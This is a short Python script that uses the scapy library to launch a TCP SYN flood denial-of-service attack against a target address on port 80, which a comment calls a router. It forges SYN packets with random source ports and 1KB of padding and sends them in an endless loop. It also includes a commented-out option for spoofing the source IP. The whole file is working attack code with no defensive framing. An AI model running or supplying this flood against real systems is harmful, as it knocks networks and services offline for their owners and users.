from scapy.all import *
from scapy.all import IP, TCP

target_ip ="192.168.1.2" #router ip
target_port = 80

#forge IP packets with target ip as the destination IP address
ip = IP(dst=target_ip)

#if you want to preform IP spoofing will work as well
#ip = IP(src=RandIP("192.168.1.1/24"), dst=targer_ip)

#forge a TCP SYN flag on a random sourse port and target port as destination port
tcp = TCP(sport=RandShort(), dport = target_port, flags="S")#"S" for syn 

#add some flooding data 1KB in this case
raw = Raw(b"X"*1024)

#stack up the layers
p = ip / tcp / raw

#send the constructed packet in a loop until CTRL+C is detected
send(p, loop=1, verbose=1,)
